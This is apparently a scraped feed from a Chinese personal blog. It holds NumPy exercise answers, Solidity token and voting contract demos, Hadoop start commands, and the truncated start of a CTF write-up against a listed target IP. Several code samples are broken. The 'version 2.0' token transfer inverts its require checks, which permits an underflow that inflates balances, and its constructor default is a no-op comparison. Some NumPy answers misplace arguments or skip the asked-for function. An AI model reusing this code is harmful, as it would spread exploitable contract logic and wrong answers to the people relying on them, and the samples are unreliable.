10)</p></blockquote><h5 id="11-执行-x-np-array-1-2-，然后输出-x-的数据类型"><a href="#11-执行-x-np-array-1-2-，然后输出-x-的数据类型" class="headerlink" title="11. 执行 x = np.array([1, 2])，然后输出 x 的数据类型"></a>11. 执行 x = np.array([1, 2])，然后输出 x 的数据类型</h5><blockquote><p>x = np.array([1,2])<br>print(x.dtype)</p></blockquote><h5 id="12-执行-x-np-array-1-0-2-0-，然后输出-x-的数据类类型"><a href="#12-执行-x-np-array-1-0-2-0-，然后输出-x-的数据类类型" class="headerlink" title="12.执行 x = np.array([1.0, 2.0]) ，然后输出 x 的数据类类型"></a>12.执行 x = np.array([1.0, 2.0]) ，然后输出 x 的数据类类型</h5><blockquote><p>x = np.array([1.0,2.0])<br>print(x.dtype)</p></blockquote><h5 id="13-执行-x-np-array-1-2-3-4-dtype-np-float64-，y-np-array-5-6-7-8-dtype-np-float64-，然后输出-x-y-和-np-add-x-y"><a href="#13-执行-x-np-array-1-2-3-4-dtype-np-float64-，y-np-array-5-6-7-8-dtype-np-float64-，然后输出-x-y-和-np-add-x-y" class="headerlink" title="13.执行 x = np.array([[1, 2], [3, 4]], dtype=np.float64) ，y = np.array([[5, 6], [7, 8]], dtype=np.float64)，然后输出 x+y ,和 np.add(x,y)"></a>13.执行 x = np.array([[1, 2], [3, 4]], dtype=np.float64) ，y = np.array([[5, 6], [7, 8]], dtype=np.float64)，然后输出 x+y ,和 np.add(x,y)</h5><blockquote><p>x= np.array([[1, 2], [3, 4]], dtype=np.float64)<br>y = np.array([[5, 6], [7, 8]])<br>print(x+y)<br>print(np.add(x,y))</p></blockquote><h5 id="14-利用-13题目中的x-y-输出-x-y-和-np-subtract-x-y"><a href="#14-利用-13题目中的x-y-输出-x-y-和-np-subtract-x-y" class="headerlink" title="14. 利用 13题目中的x,y 输出 x-y 和 np.subtract(x,y)"></a>14. 利用 13题目中的x,y 输出 x-y 和 np.subtract(x,y)</h5><blockquote><p>print(x-y)<br>print(np.subtract(x,y))</p></blockquote><h5 id="15-利用13题目中的x，y-输出-x-y-和-np-multiply-x-y-还有-np-dot-x-y-比较差异。然后自己换一个不是方阵的试试。"><a href="#15-利用13题目中的x，y-输出-x-y-和-np-multiply-x-y-还有-np-dot-x-y-比较差异。然后自己换一个不是方阵的试试。" class="headerlink" title="15. 利用13题目中的x，y 输出 x*y ,和 np.multiply(x, y) 还有 np.dot(x,y),比较差异。然后自己换一个不是方阵的试试。"></a>15. 利用13题目中的x，y 输出 x*y ,和 np.multiply(x, y) 还有 np.dot(x,y),比较差异。然后自己换一个不是方阵的试试。</h5><blockquote><p>print(x<em>y)<br>print(np.dot(x,y))<br>a = np.ones([5,5])<br>b = np.ones([5,5])<br>print(a</em>b)<br>print(np.dot(a,b))</p></blockquote><h5 id="16-利用13题目中的x-y-输出-x-y-提示-：-使用函数-np-divide"><a href="#16-利用13题目中的x-y-输出-x-y-提示-：-使用函数-np-divide" class="headerlink" title="16. 利用13题目中的x,y,输出 x / y .(提示 ： 使用函数 np.divide())"></a>16. 利用13题目中的x,y,输出 x / y .(提示 ： 使用函数 np.divide())</h5><blockquote><p>print(x/y)<br>print(np.divide(x,y))</p></blockquote><h5 id="17-利用13题目中的x-输出-x的-开方。-提示：-使用函数-np-sqrt"><a href="#17-利用13题目中的x-输出-x的-开方。-提示：-使用函数-np-sqrt" class="headerlink" title="17. 利用13题目中的x,输出 x的 开方。(提示： 使用函数 np.sqrt() )"></a>17. 利用13题目中的x,输出 x的 开方。(提示： 使用函数 np.sqrt() )</h5><blockquote><p>print(np.sqrt(x))</p></blockquote><h5 id="18-利用13题目中的x-y-执行-print-x-dot-y-和-print-np-dot-x-y"><a href="#18-利用13题目中的x-y-执行-print-x-dot-y-和-print-np-dot-x-y" class="headerlink" title="18.利用13题目中的x,y ,执行 print(x.dot(y)) 和 print(np.dot(x,y))"></a>18.利用13题目中的x,y ,执行 print(x.dot(y)) 和 print(np.dot(x,y))</h5><blockquote><p>print(x.dot(y))<br>print(np.dot(x,y))</p></blockquote><h5 id="19-利用13题目中的-x-进行求和。提示：输出三种求和-1-print-np-sum-x-2-print-np-sum-x，axis-0-3-print-np-sum-x-axis-1"><a href="#19-利用13题目中的-x-进行求和。提示：输出三种求和-1-print-np-sum-x-2-print-np-sum-x，axis-0-3-print-np-sum-x-axis-1" class="headerlink" title="19.利用13题目中的 x,进行求和。提示：输出三种求和 (1)print(np.sum(x)): (2)print(np.sum(x，axis =0 )); (3)print(np.sum(x,axis = 1))"></a>19.利用13题目中的 x,进行求和。提示：输出三种求和 (1)print(np.sum(x)): (2)print(np.sum(x，axis =0 )); (3)print(np.sum(x,axis = 1))</h5><blockquote><p>print(np.sum(x))<br>print(np.sum(x,axis=0))<br>print(np.sum(x,axis=1))</p></blockquote><h5 id="20-利用13题目中的-x-进行求平均数（提示：输出三种平均数-1-print-np-mean-x-2-print-np-mean-x-axis-0-3-print-np-mean-x-axis-1-）"><a href="#20-利用13题目中的-x-进行求平均数（提示：输出三种平均数-1-print-np-mean-x-2-print-np-mean-x-axis-0-3-print-np-mean-x-axis-1-）" class="headerlink" title="20.利用13题目中的 x,进行求平均数（提示：输出三种平均数(1)print(np.mean(x)) (2)print(np.mean(x,axis = 0))(3) print(np.mean(x,axis =1))）"></a>20.利用13题目中的 x,进行求平均数（提示：输出三种平均数(1)print(np.mean(x)) (2)print(np.mean(x,axis = 0))(3) print(np.mean(x,axis =1))）</h5><blockquote><p>print(np.mean(x))<br>print(np.mean(x,axis=0))<br>print(np.mean(x,axis=1))</p></blockquote><h5 id="21-利用13题目中的x，对x-进行矩阵转置，然后输出转置后的结果，（提示：-x-T-表示对-x-的转置）"><a href="#21-利用13题目中的x，对x-进行矩阵转置，然后输出转置后的结果，（提示：-x-T-表示对-x-的转置）" class="headerlink" title="21.利用13题目中的x，对x 进行矩阵转置，然后输出转置后的结果，（提示： x.T 表示对 x 的转置）"></a>21.利用13题目中的x，对x 进行矩阵转置，然后输出转置后的结果，（提示： x.T 表示对 x 的转置）</h5><blockquote><p>print(x)<br>print(x.T)</p></blockquote><h5 id="22-利用13题目中的x-求e的指数（提示：-函数-np-exp-）"><a href="#22-利用13题目中的x-求e的指数（提示：-函数-np-exp-）" class="headerlink" title="22.利用13题目中的x,求e的指数（提示： 函数 np.exp()）"></a>22.利用13题目中的x,求e的指数（提示： 函数 np.exp()）</h5><blockquote><p>print(np.exp(x))</p></blockquote><h5 id="23-利用13题目中的-x-求值最大的下标（提示-1-print-np-argmax-x-2-print-np-argmax-x-axis-0-3-print-np-argmax-x-axis-1"><a href="#23-利用13题目中的-x-求值最大的下标（提示-1-print-np-argmax-x-2-print-np-argmax-x-axis-0-3-print-np-argmax-x-axis-1" class="headerlink" title="23.利用13题目中的 x,求值最大的下标（提示(1)print(np.argmax(x)) ,(2) print(np.argmax(x, axis =0))(3)print(np.argmax(x),axis =1))"></a>23.利用13题目中的 x,求值最大的下标（提示(1)print(np.argmax(x)) ,(2) print(np.argmax(x, axis =0))(3)print(np.argmax(x),axis =1))</h5><blockquote><p>print(np.argmax(x))<br>print(np.argmax(x,axis=0))<br>print(np.argmax(x),axis=1)</p></blockquote><h5 id="24-画图，y-x-x-其中-x-np-arange-0-100-0-1-（提示这里用到-matplotlib-pyplot-库）"><a href="#24-画图，y-x-x-其中-x-np-arange-0-100-0-1-（提示这里用到-matplotlib-pyplot-库）" class="headerlink" title="24.画图，y=x*x 其中 x = np.arange(0, 100, 0.1) （提示这里用到 matplotlib.pyplot 库）"></a>24.画图，y=x*x 其中 x = np.arange(0, 100, 0.1) （提示这里用到 matplotlib.pyplot 库）</h5><blockquote><p>x = np.arange(0, 100, 0.1)<br>y = x * x<br>plt.plot(x, y)<br>plt.show()</p></blockquote><h5 id="25-画图。画正弦函数和余弦函数，-x-np-arange-0-3-np-pi-0-1-提示：这里用到-np-sin-np-cos-函数和-matplotlib-pyplot-库"><a href="#25-画图。画正弦函数和余弦函数，-x-np-arange-0-3-np-pi-0-1-提示：这里用到-np-sin-np-cos-函数和-matplotlib-pyplot-库" class="headerlink" title="25.画图。画正弦函数和余弦函数， x = np.arange(0, 3 * np.pi, 0.1)(提示：这里用到 np.sin() np.cos() 函数和 matplotlib.pyplot 库)"></a>25.画图。画正弦函数和余弦函数， x = np.arange(0, 3 * np.pi, 0.1)(提示：这里用到 np.sin() np.cos() 函数和 matplotlib.pyplot 库)</h5><blockquote><p>x = np.arange(0, 3*np.pi, 0.1)<br>y = np.sin(x)<br>plt.plot(x, y)<br>plt.show()<br>y = np.cos(x)<br>plt.plot(x, y)<br>plt.show()</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;numpy作业&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>区块链</title>
    <link href="http://runindark.com/2019/11/17/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <id>http://runindark.com/2019/11/17/区块链/</id>
    <published>2019-11-17T04:46:17.809Z</published>
    <updated>2019-11-25T11:06:21.034Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><h2 id="导航雷达"><a href="#导航雷达" class="headerlink" title="导航雷达"></a>导航雷达</h2><h3 id="区块链白皮书"><a href="#区块链白皮书" class="headerlink" title="区块链白皮书"></a>区块链白皮书</h3><blockquote><p><a href="https://ethfans.org/posts/ethereum-whitepaper" target="_blank" rel="noopener">https://ethfans.org/posts/ethereum-whitepaper</a></p></blockquote><h2 id="钱包教程"><a href="#钱包教程" class="headerlink" title="钱包教程"></a>钱包教程</h2><blockquote><p><a href="http://www.aibbt.com/a/26227.html" target="_blank" rel="noopener">http://www.aibbt.com/a/26227.html</a></p></blockquote><h2 id="国内矿池"><a href="#国内矿池" class="headerlink" title="国内矿池"></a>国内矿池</h2><h3 id="f2pool"><a href="#f2pool" class="headerlink" title="f2pool"></a>f2pool</h3><blockquote><p><a href="https://www.f2pool.com/" target="_blank" rel="noopener">https://www.f2pool.com/</a></p></blockquote><h2 id="truffle"><a href="#truffle" class="headerlink" title="truffle"></a>truffle</h2><p>Truffle 教程：教你开发、部署第一个去中心化应用 (Dapp) - 宠物商店</p><h2 id="blockchain-demo"><a href="#blockchain-demo" class="headerlink" title="blockchain-demo"></a>blockchain-demo</h2><h3 id="MyToken-EC20-官方铸币代码"><a href="#MyToken-EC20-官方铸币代码" class="headerlink" title="MyToken - EC20 - 官方铸币代码"></a>MyToken - EC20 - 官方铸币代码</h3><ol><li>version 1.0</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.20</span>;</span><br><span class="line"></span><br><span class="line">contract MyToken&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*创建一个带有全部余额的key-value数组*/</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*初始化区块铸币总金额，利用这样的方法可以保证货币后期总量不会被改变*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myToken</span> (<span class="params">uint256 initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        balanceOf[msg.sender] = initialSupply ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*金额转账*/</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span> (<span class="params">address _to,uint256 _value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*确保发出请求的余额充足*/</span></span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &gt;= _value);</span><br><span class="line">        <span class="comment">/*过流检验*/</span></span><br><span class="line">        <span class="built_in">require</span>(balanceOf[_to] + _value &gt;= balanceOf[_to]) ;</span><br><span class="line">        balanceOf[msg.sender] -= _value ;</span><br><span class="line">        balanceOf[_to] += _value ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>version 2.0<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract MyToken&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    string public name ; <span class="comment">// coin name</span></span><br><span class="line">    string public symbol ; <span class="comment">// coin symbol</span></span><br><span class="line">    uint8 public decimals ; <span class="comment">// coin decimals</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// key-value for all people in this block</span></span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// track for dealing</span></span><br><span class="line">    event Transfer (address indexed_from,address indexed_to,uint256 value) ;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>(uint256 _supply,string _name,string _symbol,uint8 _decimals) public &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (_supply == <span class="number">0</span>) _supply == <span class="number">1000000</span> ;</span><br><span class="line">        balanceOf[msg.sender] = _supply ;</span><br><span class="line">        name = _name ;</span><br><span class="line">        symbol = _symbol ;</span><br><span class="line">        decimals = _decimals ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transfer</span> (<span class="params">address _to,uint256 _value</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.sender] &lt; _value) ;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[_to] + _value &lt; balanceOf[_to]) ;</span><br><span class="line">        </span><br><span class="line">        balanceOf[msg.sender] -= _value ;</span><br><span class="line">        balanceOf[_to] += _value ;</span><br><span class="line">        </span><br><span class="line">        emit Transfer(msg.sender,_to,_value) ;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="投票系统-综合类合约"><a href="#投票系统-综合类合约" class="headerlink" title="投票系统 - 综合类合约"></a>投票系统 - 综合类合约</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.22</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 投票合约</span></span><br><span class="line">contract Ballot&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//此处声明一个新的复合类型，代表一个单一投票者</span></span><br><span class="line">    struct Voter&#123;</span><br><span class="line">        uint weight ;</span><br><span class="line">        bool voted ;</span><br><span class="line">        address delegate ;</span><br><span class="line">        uint vote ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 用于单一提案的结构类型</span></span><br><span class="line">    struct Proposal&#123;</span><br><span class="line">        bytes32 name ;</span><br><span class="line">        uint voteCount ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 当前选票人地址</span></span><br><span class="line">    address public chairperson ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 投票人员</span></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> Voter) public voters ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提案编号</span></span><br><span class="line">    Proposal[] public proposals ;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 选择proposalNames 创建新的的投票</span></span><br><span class="line">    <span class="keyword">constructor</span> (bytes32[] proposalNames) public &#123;</span><br><span class="line">        chairperson = msg.sender ;</span><br><span class="line">        voters[chairperson].weight = <span class="number">1</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对于每个提供的提案名，创建一个新的提案对象，加到数组末尾</span></span><br><span class="line">        <span class="keyword">for</span> (uint i=<span class="number">0</span>;i&lt;proposalNames.length;i++)&#123;</span><br><span class="line">            proposals.push(Proposal(&#123;</span><br><span class="line">                name : proposalNames[i],</span><br><span class="line">                voteCount : <span class="number">0</span> </span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 对于本次投票中的“voter”给予投票权，只能由 “chairperson”调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">giveRightToVote</span>(<span class="params">address voter</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 如果require的第一个参数结果为false，则执行中止，所有状态变化，以太币余额变化都会还原</span></span><br><span class="line">        <span class="comment">// 老版EVM中，这会耗光所有GAS</span></span><br><span class="line">        <span class="comment">// “require” 来检查函数是否正确调用</span></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.sender == chairperson ,</span><br><span class="line">            <span class="string">"only chairperson can give right to vote"</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            !voters[voter].voted,</span><br><span class="line">            <span class="string">"The voter already voted"</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(voters[voter].weight == <span class="number">0</span>) ;</span><br><span class="line">        voters[voter].weight = <span class="number">1</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 把投票权赋予投票人 “to”</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">address to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对引用赋值</span></span><br><span class="line">        Voter storage sender = voters[msg.sender] ;</span><br><span class="line">        <span class="built_in">require</span> (!sender.voted,<span class="string">"You are already voted"</span>) ;</span><br><span class="line">        <span class="built_in">require</span>(to != msg.sender, <span class="string">"self-delegation is disallowed"</span>) ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 当“to”也是被授权时，继续转授权</span></span><br><span class="line">        <span class="comment">// 一般来说这种循环很危险，因为运行时间长，与完成一个区块相比，需要更多的gas费用</span></span><br><span class="line">        <span class="comment">// 在本例中，代表授权不会被执行。在其他情况下，这一循环可能导致合约的非正常运行</span></span><br><span class="line">        <span class="keyword">while</span> (voters[to].delegate != address(<span class="number">0</span>))&#123;</span><br><span class="line">            to = voters[to].delegate ;</span><br><span class="line">            <span class="comment">// 检验是否存在不允许的代表授权</span></span><br><span class="line">            <span class="built_in">require</span>(to != msg.sender,<span class="string">"Found loop in delegation"</span>) ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// sender是一个引用，所以修改了“voters[msg.sender].voted”</span></span><br><span class="line">        sender.voted = <span class="literal">true</span> ;</span><br><span class="line">        sender.delegate = to ;</span><br><span class="line">        Voter storage delegate_ = voters[to] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (delegate_.voted)&#123;</span><br><span class="line">            <span class="comment">// 如果代表已投票，则直接增加投票数量</span></span><br><span class="line">            proposals[delegate_.vote].voteCount += sender.weight ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果代表未投票，则增加权重</span></span><br><span class="line">            delegate_.weight += sender.weight ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将投票（包括授权给你的投票）投给提案“proposals[proposal].name”</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vote</span> (<span class="params">uint proposal</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        Voter storage sender = voters[msg.sender] ;</span><br><span class="line">        <span class="built_in">require</span>(!sender.voted,<span class="string">"Already voted"</span>) ;</span><br><span class="line">        sender.voted = <span class="literal">true</span> ;</span><br><span class="line">        sender.vote = proposal ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果 “proposal”超过数组范围，则自动释放这一信息，并还原所有改变</span></span><br><span class="line">        proposals[proposal].voteCount += sender.weight ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据此前全部投票，统计获胜提案</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">winningProposal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint winningProposal_</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        uint winningVoteCount = <span class="number">0</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (uint p=<span class="number">0</span>;p&lt;proposals.length;p++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (proposals[p].voteCount &gt; winningVoteCount)&#123;</span><br><span class="line">                winningVoteCount = proposals[p].voteCount ;</span><br><span class="line">                winningProposal_= p ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用call winningPropopsal() 函数取得包含在提案数组中的获胜者的索引，并返回获胜者的名称</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">winnerName</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes32 winnerName_</span>)</span>&#123;</span><br><span class="line">        winnerName_ = proposals[winningProposal()].name ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hadoop操作</title>
    <link href="http://runindark.com/2019/10/25/hadoop/"/>
    <id>http://runindark.com/2019/10/25/hadoop/</id>
    <published>2019-10-25T03:47:01.713Z</published>
    <updated>2019-10-25T03:57:04.318Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>hadoop 系列操作<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="hadoop-启动"><a href="#hadoop-启动" class="headerlink" title="hadoop 启动"></a>hadoop 启动</h3><blockquote><p>cd <em>**</em>  进入hadoop目录<br>./sbin/start-dfs.sh  启动hadoop-dfs<br>./sbin/start-all.sh  启动所有的</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;hadoop 系列操作&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf - 合集</title>
    <link href="http://runindark.com/2019/10/24/CTF-%E5%81%9A%E9%A2%98%E5%90%88%E9%9B%86/"/>
    <id>http://runindark.com/2019/10/24/CTF-做题合集/</id>
    <published>2019-10-24T13:02:54.218Z</published>
    <updated>2019-11-08T10:22:07.620Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>自己后来做过的各种乱七八糟的题目<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="爱い窒息、痛-—-php源码阅读-让系统读木马"><a href="#爱い窒息、痛-—-php源码阅读-让系统读木马" class="headerlink" title="爱い窒息、痛 —- php源码阅读,让系统读木马"></a>爱い窒息、痛 —- php源码阅读,让系统读木马</h3><blockquote><p>靶机：<a href="http://114.55.36.69:8020" target="_blank" rel="noopener">http://114.55.36.69:8020</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* vim: set expandtab tabstop=4 shiftwidth=4: */</span></span><br><span class="line"><span class="comment">// 